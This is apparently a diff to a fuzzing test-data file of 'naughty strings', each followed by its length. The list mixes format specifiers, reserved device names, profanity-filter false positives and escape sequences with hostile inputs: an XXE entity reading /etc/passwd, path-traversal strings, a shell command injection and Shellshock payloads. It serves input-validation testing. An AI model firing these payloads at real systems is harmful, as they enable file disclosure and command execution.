+Kernel.exit(1) => 14
+%x('ls -al /') => 14
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> => 138
+$HOME => 5
+$ENV{'HOME'} => 12
+%d => 2
+%s => 2
+{0} => 3
+%*.*s => 5
+File:/// => 8
+../../../../../../../../../../../etc/passwd%00 => 46
+../../../../../../../../../../../etc/hosts => 42
+() { 0; }; touch /tmp/blns.shellshock1.fail; => 44
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; } => 58
+<<< %s(un='%s') = %u => 20
++++ATH0 => 7
+CON => 3
+PRN => 3
+AUX => 3
+CLOCK$ => 6
+NUL => 3
+A: => 2
+ZZ: => 3
+COM1 => 4
+LPT1 => 4
+LPT2 => 4
+LPT3 => 4
+COM2 => 4
+COM3 => 4
+COM4 => 4
+DCC SEND STARTKEYLOGGER 0 0 0 => 29
+Scunthorpe General Hospital => 27
+Penistone Community Church => 26
+Lightwater Country Park => 23
+Jimmy Clitheroe => 15
+Horniman Museum => 15
+shitake mushrooms => 17
+RomansInSussex.co.uk => 20
+http://www.cum.qc.ca/ => 21
+Craig Cockburn, Software Specialist => 35
+Linda Callahan => 14
+Dr. Herman I. Libshitz => 22
+magna cum laude => 15
+Super Bowl XXX => 14
+medieval erection of parapets => 29
+evaluate => 8
+mocha => 5
+expression => 10
+Arsenal canal => 13
+classic => 7
+Tyson Gay => 9
+Dick Van Dyke => 13
+basement => 8
+If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you. => 211
+Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue => 78
+But now...[20Cfor my greatest trick...[8m => 43
+The quick brown fox... [Beeeep] => 48
+Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗 => 33
